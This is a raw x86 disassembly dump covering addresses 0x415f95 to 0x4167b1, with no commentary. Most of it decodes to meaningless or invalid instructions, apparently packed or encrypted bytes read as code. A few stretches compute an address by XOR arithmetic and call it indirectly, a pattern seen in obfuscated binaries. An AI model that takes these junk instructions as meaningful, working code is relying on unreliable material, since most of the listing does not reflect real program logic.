  415f95:	shr    ecx,1
  415f97:	int    0x72
  415f99:	aam    0xe6
  415f9b:	xor    eax,0x2434d458
  415fa0:	(bad)  
  415fa1:	dec    esp
  415fa2:	loop   0x415f4b
  415fa4:	jne    0x415fb6
  415fa6:	xor    BYTE PTR [esi+0x77],al
  415fa9:	push   edx
  415faa:	inc    ebx
  415fab:	push   0x23
  415fad:	add    al,0x2e
  415faf:	adc    DWORD PTR [ecx],esp
  415fb1:	mov    ds:0x2def49a,eax
  415fb6:	jbe    0x415fa3
  415fb8:	jnp    0x416019
  415fba:	mov    eax,0x80526ff3
  415fbf:	test   DWORD PTR [edi],ecx
  415fc1:	(bad)  
  415fc2:	lea    edx,[edi-0x4c]
  415fc5:	fidiv  DWORD PTR [edx-0x312971da]
  415fcb:	in     al,dx
  415fcc:	or     DWORD PTR [edx-0x14],esi
  415fcf:	int3   
  415fd0:	lods   al,BYTE PTR ds:[esi]
  415fd1:	or     BYTE PTR [ecx],bh
  415fd3:	or     DWORD PTR [eax+0x52d67f7b],edi
  415fd9:	das    
  415fda:	fild   WORD PTR [eax+0x4d]
  415fdd:	imul   ebp,ebp,0x5c49a171
  415fe3:	sub    BYTE PTR [ebx+0x1338b0b8],0x25
  415fea:	test   DWORD PTR [edx+0x28],esi
  415fed:	stos   DWORD PTR es:[edi],eax
  415fee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415fef:	jno    0x415f7e
  415ff1:	ins    DWORD PTR es:[edi],dx
  415ff2:	outs   dx,DWORD PTR ds:[esi]
  415ff3:	sahf   
  415ff4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ff5:	pop    eax
  415ff6:	out    0x26,al
  415ff8:	lea    ebp,[ecx+0x30]
  415ffb:	retf   0xe37
  415ffe:	out    0xb5,eax
  416000:	retf   
  416001:	mov    bl,dl
  416003:	aaa    
  416004:	ret    
  416005:	jmp    DWORD PTR [ecx]
  416007:	jb     0x416045
  416009:	jle    0x415fd1
  41600b:	(bad)
  41600e:	add    bl,BYTE PTR [ebx+0x586a6de1]
  416014:	xchg   ecx,eax
  416015:	xor    dh,al
  416017:	out    dx,al
  416018:	out    0x10,al
  41601a:	sbb    DWORD PTR [edi-0x5d3971a7],ebx
  416020:	jg     0x415fe8
  416022:	inc    ebp
  416023:	push   edx
  416024:	iret   
  416025:	(bad)  
  416026:	pop    ecx
  416027:	inc    ecx
  416028:	daa    
  416029:	mov    bl,0x6e
  41602b:	add    eax,0xc88cf527
  416030:	pop    es
  416031:	inc    edx
  416032:	or     ecx,DWORD PTR [ebx+ecx*1]
  416035:	fdivrp st(3),st
  416037:	pop    esi
  416038:	add    eax,0xc424fd99
  41603d:	ror    BYTE PTR [esi+ecx*2-0x2e],0xd
  416042:	in     eax,0x86
  416044:	cmp    esp,DWORD PTR [ebx-0x2b7e0a6c]
  41604a:	iret   
  41604b:	(bad)  
  41604c:	cli    
  41604d:	or     al,0xac
  41604f:	dec    ebp
  416050:	adc    al,0xea
  416052:	mov    DWORD PTR [ebp-0x6f8e7471],ebx
  416058:	xor    esp,ebx
  41605a:	jge    0x4160bc
  41605c:	push   es
  41605d:	push   eax
  41605e:	mov    ss,esi
  416060:	push   ds
  416061:	push   ebx
  416062:	shl    DWORD PTR [ecx+eax*2+0x558be1cd],0x8
  41606a:	xor    eax,ecx
  41606c:	lea    eax,[eax+edx*1+0x32729c]
  416073:	mov    DWORD PTR [ebp+0x8],eax
  416076:	mov    eax,DWORD PTR [ebp-0x18]
  416079:	mov    edx,DWORD PTR [ebp+0x14]
  41607c:	xor    eax,ecx
  41607e:	add    eax,esi
  416080:	imul   eax,DWORD PTR [edx]
  416083:	mov    edx,DWORD PTR [ebp-0x4]
  416086:	xor    edx,ecx
  416088:	jmp    0x41636c
  41608d:	adc    ecx,DWORD PTR [edx]
  41608f:	iret   
  416090:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416091:	aad    0x61
  416093:	jae    0x41603f
  416095:	jl     0x4160ed
  416097:	cs jge 0x4160e9
  41609a:	sub    BYTE PTR ss:[edi],dh
  41609d:	retf   0x7f17
  4160a0:	jo     0x41605b
  4160a2:	jle    0x416114
  4160a4:	jo     0x41609d
  4160a6:	sbb    eax,0x949c55d6
  4160ab:	lock retf 0x1fdc
  4160af:	sub    al,0x37
  4160b1:	xor    al,0x72
  4160b3:	sbb    al,0x75
  4160b5:	ret    0xa15b
  4160b8:	call   0xc91b:0xcfd4cea
  4160bf:	stos   DWORD PTR es:[edi],eax
  4160c0:	mov    cl,BYTE PTR [edx+0xe3d4181]
  4160c6:	and    DWORD PTR [eax],ecx
  4160c8:	sub    ecx,DWORD PTR [ecx-0x5ed170a4]
  4160ce:	pusha  
  4160cf:	leave  
  4160d0:	push   edx
  4160d1:	adc    eax,0xd162f46b
  4160d6:	mov    al,BYTE PTR [esi]
  4160d8:	or     ebx,ebp
  4160da:	sbb    edx,ebp
  4160dc:	add    esi,esp
  4160de:	adc    eax,0x3c683629
  4160e3:	or     ecx,DWORD PTR [esi]
  4160e5:	cmp    BYTE PTR [ebp+0x4f540c69],ch
  4160eb:	loop   0x4160a5
  4160ed:	in     eax,0x51
  4160ef:	mov    dl,ch
  4160f1:	mov    al,BYTE PTR [eax+eiz*1-0x7a3e7d9]
  4160f8:	add    bh,BYTE PTR [esi]
  4160fa:	shl    BYTE PTR [ecx],1
  4160fc:	jmp    0xf24ac85c
  416101:	or     eax,0x42ce486f
  416106:	xor    esp,DWORD PTR [ebx-0x12]
  416109:	jl     0x4160a7
  41610b:	cmp    DWORD PTR [edi],edx
  41610d:	stos   DWORD PTR es:[edi],eax
  41610e:	jp     0x416145
  416110:	jae    0x416172
  416112:	fcomp  QWORD PTR [edi+edi*2+0xc82c0e]
  416119:	mov    DWORD PTR [eax],esi
  41611b:	stos   DWORD PTR es:[edi],eax
  41611c:	push   0xffffffde
  41611e:	xor    eax,0x8ba9b0de
  416123:	mov    ebp,0x49c221a9
  416128:	and    al,0x9e
  41612a:	(bad)  
  41612b:	mov    ebx,0x54ffd7a1
  416130:	stos   BYTE PTR es:[edi],al
  416131:	rol    DWORD PTR [ecx],0x87
  416134:	jbe    0x4160f6
  416136:	or     al,BYTE PTR [edx-0x4bb60de0]
  41613c:	not    BYTE PTR [eax]
  41613e:	fs out dx,eax
  416140:	stos   BYTE PTR es:[edi],al
  416141:	lahf   
  416142:	in     eax,0xf0
  416144:	fwait
  416145:	bound  esp,QWORD PTR [ebx-0x58]
  416148:	push   esp
  416149:	xchg   ecx,eax
  41614a:	dec    ebp
  41614b:	xor    bh,BYTE PTR [esi+ebx*2-0x3998e0b5]
  416152:	inc    ebp
  416153:	mov    ds:0xdbee0300,eax
  416158:	or     ecx,DWORD PTR [esi+0x7c3185e3]
  41615e:	loopne 0x416127
  416160:	mov    ds:0x5d7cf673,al
  416165:	xor    ecx,edx
  416167:	js     0x416100
  416169:	adc    DWORD PTR [edx+ecx*1+0x7b],esp
  41616d:	push   DWORD PTR [edi-0x5c]
  416170:	sub    ch,BYTE PTR [edx]
  416172:	pop    ebp
  416173:	pop    ds
  416174:	popf   
  416175:	xchg   ecx,eax
  416176:	cmp    BYTE PTR [eax],bl
  416178:	bsr    ecx,ebx
  41617b:	repz push ebp
  41617d:	popf   
  41617e:	loop   0x416153
  416180:	jns    0x4161fd
  416182:	sub    eax,DWORD PTR [esi]
  416184:	add    ebx,DWORD PTR [ecx]
  416186:	neg    bl
  416188:	dec    ecx
  416189:	call   0xa4991793
  41618e:	ror    BYTE PTR [edx+0x275f8647],0x17
  416195:	dec    ebx
  416196:	mov    ah,0x7d
  416198:	scas   al,BYTE PTR es:[edi]
  416199:	rol    BYTE PTR [esi],cl
  41619b:	mov    ah,0x90
  41619d:	in     al,dx
  41619e:	jge    0x416203
  4161a0:	sahf   
  4161a1:	ss xchg ebx,eax
  4161a3:	add    DWORD PTR [edi-0x2dcd8c51],esp
  4161a9:	push   cs
  4161aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4161ab:	fimul  DWORD PTR [ecx+0x4a0b5e64]
  4161b1:	test   dh,dl
  4161b3:	int3   
  4161b4:	ds mov esp,0x5208a139
  4161ba:	data16 jns 0x416206
  4161bd:	ret    0xd8f5
  4161c0:	mov    edx,0x3834d55e
  4161c5:	inc    ebp
  4161c6:	inc    edx
  4161c7:	loope  0x416154
  4161c9:	fcmovnu st,st(6)
  4161cb:	mov    al,0x54
  4161cd:	lahf   
  4161ce:	dec    ecx
  4161cf:	repnz stc 
  4161d1:	pop    ebx
  4161d2:	(bad)  
  4161d3:	adc    ebx,edi
  4161d5:	push   edx
  4161d6:	(bad)
  4161da:	mov    ds:0x990bf117,al
  4161df:	(bad)  
  4161e0:	and    bh,BYTE PTR [edx+esi*4-0x52]
  4161e4:	rcr    DWORD PTR [ecx-0x1c1d36f2],0xfb
  4161eb:	mov    edx,0x72f29e18
  4161f0:	call   0xfda6:0x493d0f0e
  4161f7:	fxch   st(4)
  4161f9:	adc    edx,DWORD PTR [ecx]
  4161fb:	sti    
  4161fc:	stos   DWORD PTR es:[edi],eax
  4161fd:	sahf   
  4161fe:	test   BYTE PTR [ecx],ah
  416200:	dec    edx
  416201:	mov    ah,0xac
  416203:	jg     0x4161e6
  416205:	inc    eax
  416206:	jl     0x416211
  416208:	ror    DWORD PTR [ebx],1
  41620a:	push   ebx
  41620b:	lods   eax,DWORD PTR ds:[esi]
  41620c:	repnz idiv DWORD PTR [edx-0x2e40bd61]
  416213:	fxtract 
  416215:	mov    esp,DWORD PTR [edi+0x42]
  416218:	into   
  416219:	outs   dx,DWORD PTR ds:[esi]
  41621a:	xor    BYTE PTR [ebp+0x5dff6575],ah
  416220:	mov    ds:0x17495f36,al
  416225:	mov    ds:0xdfcbbfc3,eax
  41622a:	scas   al,BYTE PTR es:[edi]
  41622b:	(bad)  
  41622c:	mov    BYTE PTR [edi+0x36],bl
  41622f:	inc    esp
  416230:	arpl   WORD PTR [edx-0x580f7f28],si
  416236:	leave  
  416237:	mov    bh,0x9b
  416239:	mov    WORD PTR [esi],?
  41623b:	adc    ecx,DWORD PTR [edx]
  41623d:	cmp    edi,ecx
  41623f:	add    bl,ah
  416241:	arpl   WORD PTR [edx-0x70f8a5d5],cx
  416247:	jo     0x4161f5
  416249:	mov    esp,0xfe666d1c
  41624e:	pop    ebp
  41624f:	pop    ss
  416250:	rcl    BYTE PTR [esi-0x59],1
  416253:	aam    0xc8
  416255:	add    DWORD PTR [esi-0xa],edx
  416258:	jl     0x4162c7
  41625a:	js     0x4162d2
  41625c:	stos   DWORD PTR es:[edi],eax
  41625d:	sub    al,BYTE PTR [eax+0x74]
  416260:	call   0xbbff17df
  416265:	iret   
  416266:	into   
  416267:	ins    BYTE PTR es:[edi],dx
  416268:	cmc    
  416269:	xor    ebp,DWORD PTR [edx+0x3242a4a3]
  41626f:	push   edx
  416270:	cmp    DWORD PTR [edx],ebp
  416272:	mov    esi,0x7783bcc7
  416277:	rcr    DWORD PTR ds:0xb5633658,cl
  41627d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41627e:	pushf  
  41627f:	push   edx
  416280:	xlat   BYTE PTR ds:[ebx]
  416281:	adc    ah,dh
  416283:	out    dx,eax
  416284:	repz xor BYTE PTR [esi],bh
  416287:	dec    edi
  416288:	outs   dx,DWORD PTR ds:[esi]
  416289:	pushf  
  41628a:	push   ebx
  41628b:	adc    edi,ebp
  41628d:	or     DWORD PTR [edi-0x5c004b6c],ecx
  416293:	pop    ecx
  416294:	xchg   BYTE PTR [edi],bl
  416296:	arpl   WORD PTR [ebx-0x3c],sp
  416299:	mov    edx,DWORD PTR [ecx+ebp*4+0x10757de7]
  4162a0:	dec    esi
  4162a1:	es (bad) 
  4162a3:	jl     0x41625e
  4162a5:	(bad)  
  4162a6:	retf   0xe4e1
  4162a9:	(bad)  [ecx-0x7d]
  4162ac:	ja     0x4162f9
  4162ae:	and    BYTE PTR [esi-0x66],cl
  4162b1:	outs   dx,DWORD PTR ds:[esi]
  4162b2:	(bad)  [edx]
  4162b4:	mov    al,ds:0x4193f6ad
  4162b9:	sub    eax,0xa3522b1e
  4162be:	dec    esp
  4162bf:	pop    ss
  4162c0:	sbb    BYTE PTR ds:0x62c1db54,ch
  4162c6:	sub    dh,BYTE PTR [edi]
  4162c8:	test   al,0x76
  4162ca:	jmp    0xc2609d30
  4162cf:	push   ebp
  4162d0:	(bad)  
  4162d1:	xchg   ebx,eax
  4162d2:	mov    ah,0xa1
  4162d4:	or     DWORD PTR [ecx-0x47],0xffffffc8
  4162d8:	(bad)  [eax+0x4a6aa42]
  4162de:	xor    DWORD PTR [esi],eax
  4162e0:	test   BYTE PTR [edx+0x617cfdbe],bl
  4162e6:	mov    esp,0x2b92e8f4
  4162eb:	push   ebp
  4162ec:	arpl   WORD PTR [edx+0x167a1b6],bp
  4162f2:	and    al,0x34
  4162f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162f5:	jmp    0xb4ccc398
  4162fa:	mov    bl,0x44
  4162fc:	dec    edi
  4162fd:	cmp    DWORD PTR [ecx-0x444af195],ebp
  416303:	push   ebp
  416304:	add    eax,0x161017ed
  416309:	push   esi
  41630a:	cmova  edi,DWORD PTR [ebx]
  41630d:	enter  0xf8b4,0x12
  416311:	dec    edi
  416312:	sub    DWORD PTR [edi+0x5360f057],edx
  416318:	add    BYTE PTR [eax-0x42c375be],ch
  41631e:	mov    gs,WORD PTR [eax+edx*2-0x47]
  416322:	arpl   WORD PTR [edx],cx
  416324:	push   0x6f
  416326:	arpl   WORD PTR [edx-0x6d],bp
  416329:	push   edx
  41632a:	cdq    
  41632b:	sbb    al,0xe4
  41632d:	rcr    BYTE PTR [esi+0x7da747e1],cl
  416333:	aad    0x32
  416335:	mov    dl,0xb
  416337:	cli    
  416338:	int    0xcb
  41633a:	(bad)  
  41633b:	mov    ebp,0xc98a99e4
  416340:	bnd jmp 0x416331
  416343:	adc    bl,BYTE PTR cs:[edi+0x7fcfdd4a]
  41634a:	push   ebx
  41634b:	(bad)  
  41634c:	into   
  41634d:	popa   
  41634e:	les    eax,FWORD PTR [ebx-0xc74dad5]
  416354:	cmc    
  416355:	push   es
  416356:	cli    
  416357:	mov    ds:0x80ab261f,eax
  41635c:	fiadd  WORD PTR [ebx-0x9d4795d]
  416362:	mov    ds:0x2283d4d5,eax
  416367:	jb     0x4163d1
  416369:	xor    dl,ah
  41636b:	sbb    BYTE PTR [ebx-0x7372f7b3],cl
  416371:	or     bl,BYTE PTR [edx+esi*2-0x37c4ffce]
  416378:	jne    0x4154a0
  41637e:	mov    ebx,esi
  416380:	jmp    0x41638a
  416385:	mov    ebx,0x32729c
  41638a:	mov    eax,DWORD PTR [ebp-0x4]
  41638d:	xor    eax,0x7510855
  416392:	add    eax,ebx
  416394:	mov    DWORD PTR [ebp-0xc],eax
  416397:	xor    ebx,ebx
  416399:	lea    eax,[ebp-0x10]
  41639c:	add    ebx,DWORD PTR [eax]
  41639e:	call   ebx
  4163a0:	xor    ebx,ebx
  4163a2:	inc    ebx
  4163a3:	cmp    DWORD PTR [ebp+0x10],ebx
  4163a6:	je     0x416f54
  4163ac:	jmp    0x416690
  4163b1:	or     al,0x9a
  4163b3:	shl    DWORD PTR [esi],1
  4163b5:	jno    0x41642c
  4163b7:	jmp    0x41636b
  4163b9:	lds    ecx,FWORD PTR ds:0x699dc841
  4163bf:	das    
  4163c0:	stos   BYTE PTR es:[edi],al
  4163c1:	adc    edx,DWORD PTR [edi+edi*2]
  4163c4:	jo     0x41637f
  4163c6:	jle    0x416438
  4163c8:	jo     0x4163a7
  4163ca:	mov    DWORD PTR [ebx-0x60048e5e],edi
  4163d0:	xchg   esp,eax
  4163d1:	push   edi
  4163d2:	inc    ecx
  4163d3:	arpl   WORD PTR fs:[eax+0x12628be2],cx
  4163da:	(bad)  
  4163db:	repnz adc ebx,DWORD PTR [edx-0x51]
  4163df:	cs js  0x416370
  4163e2:	lock sbb dl,BYTE PTR [ebp-0x33]
  4163e6:	idiv   al
  4163e8:	aas    
  4163e9:	(bad)  
  4163ea:	cmp    BYTE PTR [ebp+0x3fa1d44e],dl
  4163f0:	mov    al,ds:0x48cc70ff
  4163f5:	or     ch,BYTE PTR [esi]
  4163f7:	fistp  QWORD PTR [ebx-0x3b]
  4163fa:	mov    edx,0xbe7a3ec5
  4163ff:	dec    ebx
  416400:	in     eax,dx
  416401:	xchg   edi,eax
  416402:	aaa    
  416403:	call   0x12952ee2
  416408:	jbe    0x416456
  41640a:	cmp    BYTE PTR [edx],ah
  41640c:	push   ds
  41640d:	mov    eax,ds:0x8aa8f0f5
  416412:	stos   BYTE PTR es:[edi],al
  416413:	sub    dl,BYTE PTR [ebp-0x30d03e31]
  416419:	loopne 0x416453
  41641b:	rcr    BYTE PTR [ecx-0xb],1
  41641e:	mov    es,WORD PTR [ecx+0x4ca50720]
  416424:	stos   BYTE PTR es:[edi],al
  416425:	sbb    al,0xd8
  416427:	fs popf 
  416429:	js     0x416435
  41642b:	and    BYTE PTR [edx+0x29],al
  41642e:	in     eax,0xc2
  416430:	bnd jno 0x4163e7
  416433:	cs push ss
  416435:	xchg   DWORD PTR [ecx],ebx
  416437:	jg     0x416498
  416439:	std    
  41643a:	xor    eax,0x6949f653
  41643f:	push   ebx
  416440:	add    ebp,DWORD PTR [edx-0x4c02285a]
  416446:	sub    ebp,esi
  416448:	jb     0x416437
  41644a:	push   ebx
  41644b:	mov    al,0x9c
  41644d:	pop    esp
  41644e:	nop
  41644f:	std    
  416450:	cli    
  416451:	push   ss
  416452:	mov    esp,0xd5c43a3a
  416457:	lock ret 0x8c9e
  41645b:	sub    bl,BYTE PTR [edi-0x29]
  41645e:	fmul   DWORD PTR [ebx-0x3c]
  416461:	lahf   
  416462:	add    esp,DWORD PTR [ebx-0x2092ed19]
  416468:	es cmc 
  41646a:	pop    esp
  41646b:	xchg   BYTE PTR [esi-0x74],ch
  41646e:	mov    ecx,0x6cb851d8
  416473:	jnp    0x41646b
  416475:	(bad)
  416479:	add    al,0xdb
  41647b:	or     edi,esp
  41647d:	scas   eax,DWORD PTR es:[edi]
  41647e:	fild   QWORD PTR [edx+0x7a]
  416481:	xlat   BYTE PTR ds:[ebx]
  416482:	push   0x381fe029
  416487:	cdq    
  416488:	aas    
  416489:	jmp    FWORD PTR [esi-0x47]
  41648c:	dec    ebp
  41648d:	mov    ecx,0x3aaf72f5
  416492:	xchg   edi,eax
  416493:	sub    eax,0x61f620d5
  416498:	or     al,0x79
  41649a:	push   ds
  41649b:	(bad)  
  41649c:	rcr    ch,cl
  41649e:	fwait
  41649f:	shl    DWORD PTR [ebx-0x75],0x49
  4164a3:	inc    eax
  4164a4:	cmc    
  4164a5:	repnz fcmovnbe st,st(7)
  4164a8:	lahf   
  4164a9:	(bad)  
  4164aa:	sqrtps xmm6,XMMWORD PTR [edi-0x3097028e]
  4164b1:	mov    ds:0x2efab7d6,al
  4164b6:	mov    dh,0xe8
  4164b8:	push   edx
  4164b9:	xchg   esi,eax
  4164ba:	add    BYTE PTR [edi+0x77],dh
  4164bd:	loope  0x4164a0
  4164bf:	sub    eax,0x45138cdf
  4164c4:	cwde   
  4164c5:	in     al,0x4a
  4164c7:	mov    WORD PTR [ebx],?
  4164c9:	mov    dl,0x18
  4164cb:	test   al,0x9a
  4164cd:	sub    ebp,DWORD PTR [ebp-0x1f]
  4164d0:	mov    eax,0xa7d3bffc
  4164d5:	pop    es
  4164d6:	dec    edi
  4164d7:	(bad)  
  4164d8:	xchg   edi,eax
  4164d9:	je     0x416558
  4164db:	pop    esi
  4164dc:	adc    dl,al
  4164de:	fdiv   QWORD PTR [edi-0x44bed5eb]
  4164e4:	sub    DWORD PTR [ebx-0x26],ebp
  4164e7:	adc    eax,0x4f062c55
  4164ec:	(bad)  fs:[esi-0x67]
  4164f0:	jmp    0x560f393a
  4164f5:	cmc    
  4164f6:	mov    ch,0x6c
  4164f8:	sub    cl,BYTE PTR [eax]
  4164fa:	pop    esi
  4164fb:	popf   
  4164fc:	push   ds
  4164fd:	or     BYTE PTR [esi],dl
  4164ff:	xchg   BYTE PTR [esi+0x28c6c509],al
  416505:	mov    ebp,0xc80fa2f4
  41650a:	aaa    
  41650b:	into   
  41650c:	in     al,dx
  41650d:	xchg   esp,eax
  41650e:	adc    esp,DWORD PTR [eax-0x2bf3ced2]
  416514:	lock sub bh,BYTE PTR [ebx+0x524de749]
  41651b:	mov    ch,BYTE PTR [edi+0x3917a4f8]
  416521:	sbb    cl,BYTE PTR [edi]
  416523:	repnz xchg ecx,ebp
  416526:	dec    edx
  416527:	sahf   
  416528:	stos   BYTE PTR es:[edi],al
  416529:	jmp    0x4164c9
  41652b:	jle    0x416550
  41652d:	int    0xba
  41652f:	std    
  416530:	mov    edx,0x6eb12537
  416535:	in     al,0x4e
  416537:	mov    ds:0x5be21dc0,eax
  41653c:	mov    WORD PTR [ebx-0x19ad43c0],ds
  416542:	(bad)  [ecx+eiz*8]
  416545:	push   ebx
  416546:	test   al,0x63
  416548:	scas   eax,DWORD PTR es:[edi]
  416549:	les    edi,FWORD PTR [ecx+0x5cd74521]
  41654f:	call   0x737d5ec3
  416554:	out    dx,eax
  416555:	sar    DWORD PTR [ebx+0x610727e2],0x45
  41655c:	enter  0x934b,0x1e
  416560:	cld    
  416561:	xlat   BYTE PTR ds:[ebx]
  416562:	mov    ds:0x30acb242,al
  416567:	cmp    ecx,DWORD PTR [ebx+0x69da592b]
  41656d:	push   edi
  41656e:	push   esi
  41656f:	and    eax,0xe5ab95f4
  416574:	scas   eax,DWORD PTR es:[edi]
  416575:	lods   al,BYTE PTR ds:[esi]
  416576:	sub    dh,al
  416578:	mov    edx,0x9998154c
  41657d:	dec    edi
  41657e:	push   0x36
  416580:	sub    eax,0x328cd6c0
  416585:	cmp    BYTE PTR [ebx+0x31953ea5],al
  41658b:	call   0x8c4ad757
  416590:	push   ebx
  416591:	test   eax,0xa53f29cd
  416596:	jo     0x416571
  416598:	mov    ds,edx
  41659a:	pop    es
  41659b:	and    BYTE PTR [edi+0x17],0xf2
  41659f:	xchg   edi,eax
  4165a0:	add    al,0xcb
  4165a2:	add    ecx,DWORD PTR [ecx+0x3cc55625]
  4165a8:	data16 (bad) 
  4165aa:	fsub   QWORD PTR [ecx]
  4165ac:	out    dx,al
  4165ad:	mov    ebp,0xb89fa4e9
  4165b2:	pop    edi
  4165b3:	in     al,dx
  4165b4:	mov    bh,0x74
  4165b6:	xor    BYTE PTR [edx+0x6a081bd],ch
  4165bc:	mov    esi,0x6bbc0a1f
  4165c1:	xor    ecx,edi
  4165c3:	mov    bh,0x5b
  4165c5:	stc    
  4165c6:	hlt    
  4165c7:	push   eax
  4165c8:	js     0x4165b5
  4165ca:	aaa    
  4165cb:	or     ebp,DWORD PTR [ebx+0x52]
  4165ce:	int3   
  4165cf:	outs   dx,BYTE PTR ds:[esi]
  4165d0:	nop
  4165d1:	pop    esi
  4165d2:	lock div BYTE PTR [esi]
  4165d5:	pop    eax
  4165d6:	into   
  4165d7:	adc    BYTE PTR ss:[ebp+0xe],ah
  4165db:	mov    eax,ds:0x42990d01
  4165e0:	(bad)  
  4165e1:	into   
  4165e2:	mov    cl,0xf6
  4165e4:	inc    esi
  4165e5:	fwait
  4165e6:	nop
  4165e7:	inc    esp
  4165e8:	jge    0x416638
  4165ea:	aaa    
  4165eb:	push   edi
  4165ec:	je     0x4165b4
  4165ee:	inc    edi
  4165ef:	pop    ss
  4165f0:	inc    eax
  4165f1:	mov    dl,0x5d
  4165f3:	add    DWORD PTR [ecx+0x7a1664f9],0x13
  4165fa:	mov    BYTE PTR [ebp+0x1be29893],cl
  416600:	or     BYTE PTR [ebx+0x37f0b109],ch
  416606:	push   ebx
  416607:	aas    
  416608:	fimul  DWORD PTR [ebp-0x76f88feb]
  41660e:	mov    cl,0x64
  416610:	loop   0x416665
  416612:	mov    al,0x6d
  416614:	nop
  416615:	lock xchg edi,eax
  416617:	lock in eax,dx
  416619:	sub    al,0x6b
  41661b:	repz das 
  41661d:	sub    BYTE PTR [ecx-0x29],ch
  416620:	mov    ch,0x96
  416622:	push   esi
  416623:	add    esi,DWORD PTR [ebx]
  416625:	test   eax,0x9a600d88
  41662a:	jmp    0xc73a:0xcaa5ba4c
  416631:	cld    
  416632:	sbb    ah,BYTE PTR [ebp-0x67f43301]
  416638:	cmp    BYTE PTR [edx-0x11],bl
  41663b:	pop    esp
  41663c:	out    dx,al
  41663d:	jno    0x4165f6
  41663f:	popf   
  416640:	xor    eax,0xbdf718ca
  416645:	and    DWORD PTR [esi+0x64],esi
  416648:	add    eax,DWORD PTR [ecx]
  41664a:	in     eax,dx
  41664b:	daa    
  41664c:	mov    eax,DWORD PTR [ecx]
  41664e:	mov    ecx,0x4999c0d5
  416653:	(bad)  
  416655:	retf   0xb77e
  416658:	in     al,0xfc
  41665a:	in     al,dx
  41665b:	sbb    eax,0xa99ecf88
  416660:	icebp  
  416661:	or     al,0x8b
  416663:	mov    ah,al
  416665:	outs   dx,BYTE PTR ds:[esi]
  416666:	nop
  416667:	sbb    eax,0x10a5a70f
  41666c:	adc    cl,BYTE PTR [edx]
  41666e:	and    al,0xa5
  416670:	jb     0x41662b
  416672:	jecxz  0x416659
  416674:	push   eax
  416675:	mov    esi,0x872de69a
  41667a:	pop    ebp
  41667b:	rcr    ebp,cl
  41667d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41667e:	mov    eax,DWORD PTR ds:0x93f46902
  416684:	fwait
  416685:	adc    ebp,edx
  416687:	dec    edi
  416688:	jle    0x416622
  41668a:	pmullw mm1,QWORD PTR [ebp-0x6dd0c114]
  416691:	push   0xa
  416693:	pop    ecx
  416694:	push   0x4
  416696:	pop    ebx
  416697:	inc    ebx
  416698:	xchg   ebx,ecx
  41669a:	sub    ebx,ecx
  41669c:	jmp    0x416980
  4166a1:	cmc    
  4166a2:	icebp  
  4166a3:	retf   
  4166a4:	mov    ebp,0x717165cb
  4166a9:	test   BYTE PTR [ebx-0x79],dl
  4166ac:	jnp    0x41667d
  4166ae:	(bad)  [ebp+0x43]
  4166b1:	pop    esp
  4166b2:	adc    bh,BYTE PTR [edi+0x70]
  4166b5:	mov    ecx,0x870707e
  4166ba:	rcr    BYTE PTR [edi+0x12],0xf4
  4166be:	retf   
  4166bf:	leave  
  4166c0:	out    dx,eax
  4166c1:	mov    ds:0xdb1c059d,eax
  4166c6:	cdq    
  4166c7:	or     DWORD PTR [edi],ebp
  4166c9:	dec    esi
  4166ca:	pusha  
  4166cb:	pop    edx
  4166cc:	fs stos BYTE PTR es:[edi],al
  4166ce:	cdq    
  4166cf:	push   edx
  4166d0:	std    
  4166d1:	(bad)  
  4166d2:	dec    eax
  4166d3:	xor    BYTE PTR [edi+ebx*4-0x62491632],ah
  4166da:	fsubr  QWORD PTR [edi+0x25]
  4166dd:	push   0xffffffc9
  4166df:	aam    0xbf
  4166e1:	mov    dl,0x9a
  4166e3:	fild   QWORD PTR [ebp-0x2c]
  4166e6:	call   DWORD PTR [ebx-0x5f]
  4166e9:	mov    ah,0xcd
  4166eb:	aam    0xcc
  4166ed:	dec    edi
  4166ee:	xor    eax,0x10ffae9a
  4166f3:	pop    ds
  4166f4:	add    al,0xe0
  4166f6:	mov    WORD PTR [ecx+0x3d],cs
  4166f9:	mov    eax,ds:0xf0fa7769
  4166fe:	in     eax,0x21
  416700:	adc    eax,0x4094a967
  416705:	inc    BYTE PTR [edx]
  416707:	loope  0x4166ce
  416709:	stos   BYTE PTR es:[edi],al
  41670a:	ficom  WORD PTR [edx+0x38e3fb23]
  416710:	xchg   DWORD PTR [edi+0x1fdaea65],edx
  416716:	push   ds
  416717:	sub    BYTE PTR [ebx],0xaf
  41671a:	loop   0x4166f3
  41671c:	rcl    ch,0x7f
  41671f:	inc    eax
  416720:	cmp    DWORD PTR [eax+0x19],ebx
  416723:	mov    bh,0xf1
  416725:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416726:	dec    esp
  416727:	pop    edi
  416728:	int3   
  416729:	(bad)  
  41672a:	jnp    0x41676d
  41672c:	retf   
  41672d:	inc    ecx
  41672e:	sar    esi,1
  416730:	adc    DWORD PTR [edi+0x53c961ce],ecx
  416736:	or     BYTE PTR [ebx-0x6095d67b],ch
  41673c:	jne    0x416707
  41673e:	cs pop ebx
  416740:	mov    ebp,0x6a2a4884
  416745:	shl    al,cl
  416747:	mov    eax,0xe742113e
  41674c:	sbb    al,0xff
  41674e:	mov    ebx,0x7e1c4d16
  416753:	pop    es
  416754:	lock mov edx,0x58f46dba
  41675a:	enter  0xe3e8,0xa8
  41675e:	in     al,0x5
  416760:	add    eax,0x50c10d70
  416765:	inc    eax
  416766:	and    DWORD PTR [esp+edx*1+0x7bbc6b29],0x2e
  41676e:	add    BYTE PTR [ebp+0x61027a1e],0x7b
  416775:	js     0x329758dd
  41677b:	cwde   
  41677c:	cmp    DWORD PTR [eax+0x23a67b94],esp
  416782:	mov    esp,0xf10b3e1c
  416787:	imul   DWORD PTR [ebx+ebx*1-0x3f80dcf4]
  41678e:	and    al,BYTE PTR [esi]
  416790:	push   0x8abe65e8
  416795:	aas    
  416796:	jp     0x41674c
  416798:	jl     0x4167af
  41679a:	mov    bl,BYTE PTR [esi]
  41679c:	nop
  41679d:	push   ss
  41679e:	jmp    0x41677e
  4167a0:	mov    esp,0xfa89b9bc
  4167a5:	xor    edx,edx
  4167a7:	pop    eax
  4167a8:	pop    ebx
  4167a9:	adc    ebx,DWORD PTR [ecx+0x389bf141]
  4167af:	and    ebp,ecx
  4167b1:	jle    0x4167de
